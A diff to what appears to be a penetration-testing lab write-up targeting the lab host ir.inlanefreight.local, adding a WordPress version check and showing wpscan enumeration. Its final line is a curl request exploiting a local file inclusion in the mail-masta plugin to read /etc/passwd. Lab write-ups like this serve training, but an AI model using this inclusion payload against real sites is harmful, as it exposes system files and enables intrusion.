@@ -241,7 +241,15 @@ Finished
 
 all the vhosts are put into /etc/hosts
 
-## wordpress enum
+## ir.inlanefreight.local
+
+img1
+
+```
+curl -s http://ir.inlanefreight.local | grep WordPress 
+<meta name="generator" content="WordPress 6.0" />
+
+```
 
 ```
  wpscan --url http://ir.inlanefreight.local --enumerate
@@ -503,7 +511,7 @@ Interesting Finding(s):
 ```
 
 
-## ir.inlanefreight.local
+
 
 ```shell
 curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
